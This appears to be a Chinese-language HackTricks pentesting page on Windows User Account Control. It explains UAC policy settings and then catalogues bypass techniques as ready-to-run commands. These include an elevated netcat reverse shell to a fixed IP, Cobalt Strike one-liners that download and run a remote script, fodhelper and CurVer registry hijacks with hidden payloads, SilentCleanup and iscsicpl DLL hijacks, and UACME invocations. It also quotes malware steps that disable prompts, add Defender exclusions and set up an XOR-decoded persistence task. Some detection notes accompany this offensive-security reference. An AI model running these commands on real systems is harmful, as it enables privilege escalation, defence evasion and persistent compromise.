# UAC - 用户帐户控制

{{#include ../../banners/hacktricks-training.md}}

## UAC

[用户帐户控制 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一项会对**需要提升权限的操作显示同意提示**的功能。应用程序具有不同的 `integrity` 级别，而具有**高完整性级别**的程序可以执行**可能危及系统安全**的任务。启用 UAC 后，应用程序和任务始终**在非管理员帐户的安全上下文中运行**，除非管理员明确授权它们以管理员级别访问权限运行。它是一项便利功能，可保护管理员免受意外更改的影响，但不被视为安全边界。<sup>[[2]](#references)</sup>

有关完整性级别的更多信息：


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

启用 UAC 后，管理员用户会获得 2 个令牌：一个用于以中等完整性级别执行常规操作的标准用户令牌，以及一个拥有管理员权限的令牌。

此[页面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)深入介绍了 UAC 的工作方式，包括登录过程、用户体验和 UAC 架构。<sup>[[2]](#references)</sup> 管理员可以使用安全策略在本地（使用 secpol.msc）配置组织特定的 UAC 工作方式，也可以在 Active Directory 域环境中通过 Group Policy Objects (GPO) 配置并推送这些设置。各种设置在[此处](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)有详细说明。UAC 有 10 项可配置的 Group Policy 设置。下表提供了更多详情：

| Group Policy 设置                                                                                                                                                                                                                                                                                                                                                           | 注册表项                | 默认设置                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [用户帐户控制：内置 Administrator 帐户的管理员批准模式](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0`（已禁用）                                             |
| [用户帐户控制：管理员批准模式下管理员的提升提示行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5`（在安全桌面上提示用户同意运行非 Windows 二进制文件） |
| [用户帐户控制：标准用户的提升提示行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1`（在安全桌面上提示用户输入凭据）         |
| [用户帐户控制：检测应用程序安装并提示提升权限](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1`（已启用；默认在 Enterprise 中禁用）           |
| [用户帐户控制：仅提升已签名且经过验证的可执行文件](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0`（已禁用）                                             |
| [用户帐户控制：仅提升安装在安全位置的 UIAccess 应用程序](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1`（已启用）                                              |
| [用户帐户控制：以管理员批准模式运行所有管理员](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1`（已启用）                                              |
| [用户帐户控制：允许 UIAccess 应用程序在不使用安全桌面的情况下提示提升权限](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0`（已禁用）                                             |
| [用户帐户控制：提示提升权限时切换到安全桌面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1`（已启用）                                              |
| [用户帐户控制：将文件和注册表写入失败虚拟化到每用户位置](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1`（已启用）                                              |

### Windows 软件安装策略

默认情况下，**本地安全策略**（大多数系统上的“secpol.msc”）配置为**阻止非管理员用户安装软件**。这意味着，即使非管理员用户可以下载软件的安装程序，也无法在没有管理员帐户的情况下运行它。

### 强制 UAC 请求提升权限的注册表项

作为没有管理员权限的标准用户，你可以确保“标准”帐户在尝试执行某些操作时**收到 UAC 的凭据提示**。此操作需要修改某些**注册表项**，因此需要管理员权限，除非存在 **UAC bypass**，或者攻击者已经以管理员身份登录。

即使用户属于 **Administrators** 组，这些更改也会强制用户**重新输入帐户凭据**才能执行管理操作。

**实际上，只有在你已经拥有提升权限的令牌、UAC bypass，或存在允许你修改这些项的配置错误时，这样做才有用；否则，注册表写入操作本身就会被阻止。**

需要修改的注册表项和条目如下（括号中为默认值）：

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

也可以通过“本地安全策略”工具手动完成此操作。更改后，执行管理操作时，系统会提示用户重新输入凭据。

### 注意

**用户帐户控制不是安全边界。**因此，标准用户无法脱离自己的帐户并获得管理员权限，除非利用本地权限提升漏洞。

### 请求用户授予“对计算机的完全访问权限”

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC 权限

- Internet Explorer Protected Mode 使用完整性检查，防止高完整性级别的进程（如 Web 浏览器）访问低完整性级别的数据（如临时 Internet 文件夹）。实现方式是使用低完整性令牌运行浏览器。当浏览器尝试访问存储在低完整性区域的数据时，操作系统会检查进程的完整性级别，并据此允许访问。此功能有助于防止远程代码执行攻击访问系统上的敏感数据。
- 用户登录 Windows 时，系统会创建一个访问令牌，其中包含用户权限列表。权限由用户的权利和能力组合而成。令牌还包含用户凭据列表，这些凭据用于向计算机和网络资源验证用户身份。

### Autoadminlogon

若要配置 Windows 在启动时自动登录特定用户，请设置 **`AutoAdminLogon` 注册表项**。此设置适用于 kiosk 环境或测试用途。仅在安全的系统上使用，因为密码会以明文形式暴露在注册表中。

使用注册表编辑器或 `reg add` 设置以下项：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`：
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = 用户名
  - `DefaultPassword` = 密码

若要恢复正常的登录行为，请将 `AutoAdminLogon` 设为 0。

## UAC bypass

> [!TIP]
> 请注意，如果你能以图形界面访问受害者的系统，UAC bypass 很简单，因为 UAC 提示出现时，你只需点击“Yes”。

以下情况需要进行 UAC bypass：**UAC 已启用，你的进程在中完整性上下文中运行，并且你的用户属于管理员组**。

需要指出的是，**如果 UAC 处于最高安全级别（Always），绕过难度会比处于其他任一安全级别（Default）时高得多。**

### 从中完整性 shell 快速分诊

尝试绕过之前，请确认你处于正确的场景，并根据主机版本确定已知可用的方法：

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

实用说明：
- 如果 `EnableLUA=0`，则无需 bypass：任何管理员令牌都可以直接请求高完整性级别。
- `ConsentPromptBehaviorAdmin=2` 或 `5` 是 auto-elevate / 基于 COM 的 bypasses 常见的场景。
- `Always Notify` 会提高门槛，但仍应测试确切的 build，而不是直接假设会失败：UACME 仍在跟踪一些兼容 `AlwaysNotify` 的方法，这些方法适用于现代 Windows build。<sup>[[3]](#references)</sup>

### UAC 已禁用

如果 UAC 已禁用（`ConsentPromptBehaviorAdmin` 为 **`0`**），你可以使用类似下面的方法**以管理员权限（高完整性级别）执行 reverse shell**：

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### 使用 token duplication 绕过 UAC

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + 可复用的 debug object

AppInfo local RPC 接口 `201ef99a-7fa0-444c-9399-19ba84f12a1a` 可以创建启用了 debugging 的进程。同一线程上通过 debugging 创建的进程会共享该线程的 debug object；创建 debug event 会携带一个 full-access process handle，即使 RPC 结果本身只授予 limited access。对于 Administrators 组中的 medium-integrity 成员，这使得复用 debug object 成为一种 UAC 原语。<sup>[[11]](#references)[[12]](#references)</sup>

一个实际可用的链路如下：<sup>[[11]](#references)[[12]](#references)</sup>

1. 调用 local RPC 方法（直接调用或通过 `NdrAsyncClientCall`），创建一个启用了 debugging 的非提权牺牲进程。
2. 使用 `NtQueryInformationProcess` 查询 `ProcessDebugObjectHandle`，通过 `NtRemoveProcessDebug` 分离该对象，保留该对象，然后终止牺牲进程。
3. 使用同一 RPC 接口创建一个受信任的 auto-elevated 进程，然后通过 `DbgUiSetThreadDebugObject` 将保存的对象关联到调用线程。
4. 调用 `WaitForDebugEvent` 并获取 `CREATE_PROCESS_DEBUG_EVENT` 中的 process handle；在继续执行前，使用 `NtDuplicateObject` 复制该 handle。
5. 将复制的 handle 传给 `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)`，并使用扩展的 startup-info 结构启动 payload。这既复用了提权进程的上下文，也使子进程拥有看起来可信的父子关系。

应当关注这段短序列，而不只是 auto-elevated 二进制文件：通过 local AppInfo RPC 创建进程、查询 `ProcessDebugObjectHandle`、分离/重新附加 debugger、立即触发创建 debug event、复制 handle，以及记录的父进程与调用创建 API 的进程不匹配的子进程。<sup>[[12]](#references)</sup>

### **非常**基础的 UAC "bypass"（完整文件系统访问权限）

如果你有一个属于 Administrators 组的用户的 shell，就可以通过 SMB 将 **C$** 共享（文件系统）挂载到本地的新磁盘上，这样你就能**访问文件系统中的所有内容**（包括 Administrator 的 home 文件夹）。

> [!WARNING]
> **看起来这个技巧已经不起作用了**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### 使用 Cobalt Strike 绕过 UAC

只有在 UAC 未设置为最高安全级别时，Cobalt Strike 技术才有效。

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** 和 **Metasploit** 也有多个用于**绕过** **UAC** 的模块。

### 提权 COM 接口（`ICMLuaUtil` / `CMSTPLUA`）

在现代版本中，自动提权 COM 对象仍是实用的 UAC 攻击面。UACME 仍将 `ICMLuaUtil` 标记为在当前 Windows 分支上有效，而攻击工具也在持续调整 `CMSTPLUA` 的用法：结合交互式桌面进程、64 位执行，有时还会在调用 COM Elevation Moniker 前进行 PEB/进程伪装。<sup>[[3]](#references)</sup>

实用技巧：
- 优先使用位于用户**交互式会话**中的 **64 位**进程（通常是 `explorer.exe` 或其子进程）。
- 如果直接使用 shell 失败，请改用 BOF / UACME 实现重试，而不是使用简单的 `CreateProcess` 封装。
- 预期子进程会在**单独的提权进程**中执行；许多 BOF 不会让当前 beacon 原地提权。

### KRBUACBypass

文档和工具：[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC 绕过漏洞利用

[**UACME**](https://github.com/hfiref0x/UACME) 是一组 UAC 绕过技术。使用 Visual Studio 或 MSBuild 编译；构建会生成多个可执行文件（例如 `Source\Akagi\output\x64\Debug\Akagi.exe`），因此请选择适用于目标版本的方式。<sup>[[3]](#references)</sup>\
注意：某些绕过方式会启动可见程序或提示，可能引起用户警觉。<sup>[[3]](#references)</sup>

UACME 标明了每种技术开始生效时对应的**构建版本**。<sup>[[3]](#references)</sup> 你可以搜索影响你所用版本的技术：

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

此外，使用[此页面](https://en.wikipedia.org/wiki/Windows_10_version_history)可根据内部版本号确定 Windows 版本 `1607`。

实际操作时，建议先**评估主机内部版本**，然后再执行相应的方法：

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` 会快速将本地 build 与其已知的 UAC 方法进行比较，这有助于快速排除失效的 PoC。<sup>[[4]](#references)</sup>
- `UACME` 仍是将绕过方法映射到精确 build 的最佳公开目录。3.7.1 版新增了方法 83–85，而前一个版本则针对 **Windows 11 25H2** 重新测试了现有方法；请重新检查方法表和发行说明，不要假设旧 PoC 仍然适用且无需修改。<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify 兼容的 WNF/UIAccess 链（UACME 3.7.1）

`Always Notify` 并不能消除所有 UAC bypass。UACME 3.7.1 实现了三种新的 x64 方法，它们将用户可控的环境变量/协议状态与提升权限的计划任务或 UIAccess 行为相结合，并将这三种方法都标记为 `AlwaysNotify compatible`：<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent：** 重定向 `SystemRoot`，使 WNF 触发的 `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` 令已提升权限的 `taskhostw.exe` side-load `unifiedconsent.dll`。UACME 记录的适用范围始于 Windows 10 build 19041。
- **84 — TabTip：** 对 UIAccess `TabTip.exe` 使用相同的环境变量原语；该程序会根据 build 加载 `windows.storage.dll`、`ApplicationTargetedFeatureDatabase.dll` 或 `rsaenh.dll`，然后从由此获得的高完整性 UIAccess 上下文中继续操作。UACME 记录的适用范围始于 Windows 8.1 / Server 2016。
- **85 — Narrator：** 劫持每用户的 `feedback-hub` 协议，使用 `Alt+CapsLock+F` 驱动 Narrator，然后启动可写副本 `osk.exe`，使其 side-load `OskSupport.dll`。此方法需要交互式桌面；UACME 记录的适用范围始于 Windows 10 1809 / Server 2019。

按照 UACME 文档构建 payload 单元和 Akagi 后，调用对应的方法编号（可选命令默认为 `cmd.exe`）：

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

方法 84 和 85 依赖 UIAccess/桌面交互，因此不要指望它们在 Session 0 或非交互式服务 shell 中保持原样运行。这三种方法都会操纵环境/协议状态并暂存 DLL；测试后请检查实现并删除这些产物。<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

受信任的二进制文件 `fodhelper.exe` 在现代 Windows 上会自动提升权限。启动后，它会查询下面的每用户注册表路径，但不会验证 `DelegateExecute` 动词。将命令植入该位置，可让 Medium Integrity 进程（用户属于 Administrators 组）在不出现 UAC 提示的情况下启动 High Integrity 进程。

fodhelper 查询的注册表路径：
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>PowerShell 步骤（设置你的 payload，然后触发）</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
注意：
- 当前用户属于 Administrators 组且 UAC 级别为默认/宽松时有效（不是带有额外限制的 Always Notify）。
- 在 64 位 Windows 上，从 32 位进程启动 64 位 PowerShell 时使用 `sysnative` 路径。
- Payload 可以是任意命令（PowerShell、cmd 或 EXE 路径）。为保持隐蔽，避免弹出提示 UI。

#### 使用 `ComputerDefaults.exe` 触发相同的 `ms-settings` handler

`ComputerDefaults.exe` 会解析与 `fodhelper.exe` 相同的每用户 `ms-settings\Shell\Open\command` 关联。<sup>[[13]](#references)[[14]](#references)</sup> 设置好上文的默认命令和空 `DelegateExecute` 值后，可使用 `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` 作为替代触发方式；无需重复设置注册表。<sup>[[13]](#references)[[14]](#references)</sup> 上文 `fodhelper.exe` 说明中的中等完整性管理员和 UAC 策略前提仍然适用。<sup>[[2]](#references)[[3]](#references)</sup> UACME 将此触发方式列为适用于 Windows 10 RS4（build 17134）及更高版本，因此请在目标 build 上进行验证。<sup>[[3]](#references)</sup>

#### CurVer/扩展名劫持变体（仅限 HKCU）

近期滥用 `fodhelper.exe` 的样本会避开 `DelegateExecute`，改为通过每用户 `CurVer` 值**重定向 `ms-settings` ProgID**。这个自动提升权限的二进制仍会解析 `HKCU` 下的 handler，因此无需管理员 token 即可植入这些键：<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

提升权限后，恶意软件通常会通过将 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` 设为 `0`，**禁用后续提示**，随后执行其他防御规避操作（例如 `Add-MpPreference -ExclusionPath C:\ProgramData`），并重新创建持久化机制，以高完整性级别运行。典型的持久化任务会将 **XOR 加密的 PowerShell 脚本**存储在磁盘上，并每小时在内存中解码并执行：<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

此变体仍会清理 dropper，只留下 staged payloads，因此检测需要依赖对 **`CurVer` hijack**、`ConsentPromptBehaviorAdmin` 篡改、创建 Defender 排除项，或在内存中解密 PowerShell 的 scheduled tasks 的监控。<sup>[[5]](#references)</sup>

### 通过 `SilentCleanup` task 绕过 UAC（`HKCU\Environment\windir`）

`SilentCleanup` 会以最高权限启动 `cleanmgr.exe`，并展开用户环境中的 `%windir%`。如果你能控制 `HKCU\Environment\windir`，就可以将该展开过程重定向到任意命令，并在不显示 consent dialog 的情况下获得高完整性权限。<sup>[[8]](#references)</sup> 近期版本仍值得测试此方法，因为 UACME 仍保留此技术，近期的问题跟踪也显示，Windows 11 24H2 可能只需要微调引号即可。<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

如果该 build 会引用这个路径，请重试，并在 payload 末尾加上引号（例如 `cmd.exe"`）。测试后务必清理 `HKCU\Environment\windir`。

#### 更多 UAC bypass

许多经典的 UAC bypass 会滥用 UI 流程、COM 对象或桌面交互，因此需要与受害者建立**完整的交互式会话**；常见的 `nc.exe` shell 或运行在 **Session 0** 中的服务通常不够。

通常可以通过 **meterpreter** 会话解决这个问题。迁移到一个 **Session** 值等于 **1** 的 **process**：

![将 ms-settings 指向自定义扩展名 (.thm)，并将该扩展名映射到我们的 payload - 更多 UAC bypass：可以通过 meterpreter 会话实现。迁移到一个 Session...](<../../images/image (863).png>)

(_explorer.exe_ 应该可以)

### 使用 GUI 进行 UAC Bypass

如果你可以访问 **GUI**，只需在 UAC 提示出现时接受即可；实际上并不需要技术层面的 bypass。因此，获取 GUI 会话通常就足以绕过 UAC 带来的实际阻碍。

此外，如果你获得的是某人正在使用的 GUI 会话（可能通过 RDP），其中可能有**一些以 administrator 身份运行的工具**，你可以直接通过这些工具**运行**例如 **cmd**，并以 **admin** 身份运行，而不会再次收到 UAC 提示，例如 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。这种方式可能更**隐蔽**。

### 噪声较大的暴力破解 UAC bypass

如果可以接受产生噪声，可以使用 [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) 之类的工具，反复请求提升权限，直到用户接受。

### 自行实现 bypass - 基本 UAC bypass 方法

查看 **UACME** 后，你会发现**许多 UAC bypass 都会滥用 DLL hijacking**（通常是让一个提升权限的 binary 从可写路径加载攻击者控制的 DLL）。[阅读本文，了解如何查找 DLL hijacking 漏洞](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. 找到一个会**自动提升权限**的 binary（检查它执行时是否以高完整性级别运行）。
2. 使用 procmon 查找可能存在 **DLL Hijacking** 漏洞的 "**NAME NOT FOUND**" 事件。
3. 你可能需要将 DLL **写入**某些**受保护路径**（例如 C:\Windows\System32），但你没有写入权限。可以通过以下方式绕过：
   1. **wusa.exe**：适用于 Windows 7、8 和 8.1。它可以将 CAB 文件的内容解压到受保护路径中（因为该工具以高完整性级别运行）。
   2. **IFileOperation**：适用于 Windows 10。
4. 准备一个**脚本**，将 DLL 复制到受保护路径中，然后执行存在漏洞且会自动提升权限的 binary。

### 另一种 UAC bypass 技术

这种方法是观察某个 **autoElevated binary** 是否会尝试从 **registry** 中**读取**要**执行**的 **binary** 或 **command** 的**名称/路径**（如果该 binary 会在 **HKCU** 中查找这些信息，则更值得关注）。

### 通过 `SysWOW64\iscsicpl.exe` + 用户 `PATH` DLL hijack 实现 UAC bypass

32 位的 `C:\Windows\SysWOW64\iscsicpl.exe` 是一个**自动提升权限**的 binary，可以利用搜索顺序加载 `iscsiexe.dll`。如果你能将恶意的 `iscsiexe.dll` 放在一个**用户可写**文件夹中，然后修改当前用户的 `PATH`（例如通过 `HKCU\Environment\Path`），让 Windows 搜索该文件夹，那么 Windows 可能会在提升权限的 `iscsicpl.exe` process 中加载攻击者的 DLL，且**不会显示 UAC 提示**。<sup>[[1]](#references)[[6]](#references)</sup>

实用说明：
- 如果当前用户属于 **Administrators**，但由于 UAC 而以 **Medium Integrity** 运行，这种方法会很有用。
- 此 bypass 使用的是 **SysWOW64** 副本。应将 **System32** 副本视为独立的 binary，并单独验证其行为。
- 这种利用方式结合了**自动提升权限**和 **DLL 搜索顺序 hijacking**，因此可以使用其他 UAC bypass 中相同的 ProcMon 工作流程，来验证是否存在缺失的 DLL 加载。

最简流程：

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

检测思路：
- 对紧随其后执行 `C:\Windows\SysWOW64\iscsicpl.exe` 的 `reg add` / 写入 `HKCU\Environment\Path` 注册表行为发出警报。
- 搜索 `%TEMP%` 或 `%LOCALAPPDATA%\Microsoft\WindowsApps` 等**用户可控**位置中的 `iscsiexe.dll`。
- 将 `iscsicpl.exe` 启动行为与异常子进程或从非标准 Windows 目录加载的 DLL 关联起来。

### 值得单独检查的较新研究

一些 2024 年之后的利用链已不再表现为经典的 `HKCU\Software\Classes` 注册表劫持。例如，activation-context cache poisoning 可以串联 **drive remap** 和 **DLL redirection**，借助 `ctfmon.exe` 等受信任 UI / auto-elevated 二进制文件以及后续的 `fodhelper.exe` 等目标，从 medium integrity 提升到 high integrity。这里不再重复篇幅较长的 PoC，请查看以下精简 payload 示例：

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection（预览版）：通过每个登录会话的 DOS 设备映射劫持盘符

> [!NOTE]
> 截至 2026 年 8 月，Microsoft 仍将 Administrator Protection 标记为 **Insider 预览版**：2025 年 10 月的推出计划已撤回，后续日期待定。在测试这些利用链之前，请确认已实际启用 **带 Administrator protection 的 Admin Approval Mode**，且设备已重启；仅凭系统版本字符串显示为标准 25H2，并不能证明该功能已启用。<sup>[[10]](#references)</sup>

有关 Windows 11 25H2 预览版中完整的 `RAiLaunchAdminProcess` / UIAccess 攻击面，请查看专门页面：

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 的“Administrator Protection”使用带有每会话 `\Sessions\0\DosDevices/<LUID>` 映射的 shadow-admin token。该目录会在首次解析 `\??` 时由 `SeGetTokenDeviceMap` 延迟创建。如果攻击者仅以 **SecurityIdentification** 级别模拟 shadow-admin token，目录就会以攻击者为**所有者**创建（继承 `CREATOR OWNER`），从而允许创建优先于 `\GLOBAL??` 的盘符链接。<sup>[[7]](#references)</sup>

**步骤：**

1. 在低权限会话中调用 `RAiProcessRunOnce`，启动无提示的 shadow-admin `runonce.exe`。
2. 将其 primary token 复制为 **identification** token，并在打开 `\??` 时模拟该 token，以强制在攻击者拥有的目录下创建 `\Sessions\0\DosDevices/<LUID>`。
3. 在该目录下创建指向攻击者控制存储位置的 `C:` symlink；之后该会话中的文件系统访问都会将 `C:` 解析到攻击者路径，从而实现 DLL/file hijack，且不会出现提示。

**PowerShell PoC（NtObjectManager）：**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

在预览版主机上，Administrator Protection 会在 `Microsoft-Windows-LUA` provider 下，将批准和失败记录为 ETW 事件 **15031** 和 **15032**。这些事件包含请求者 SID、应用程序路径、结果、受管理的管理员帐户以及身份验证方法，因此反复尝试 exploit 或操作 UI 失败都不会毫无遥测记录。<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### 通过可写共享内存环转发安全桌面输入

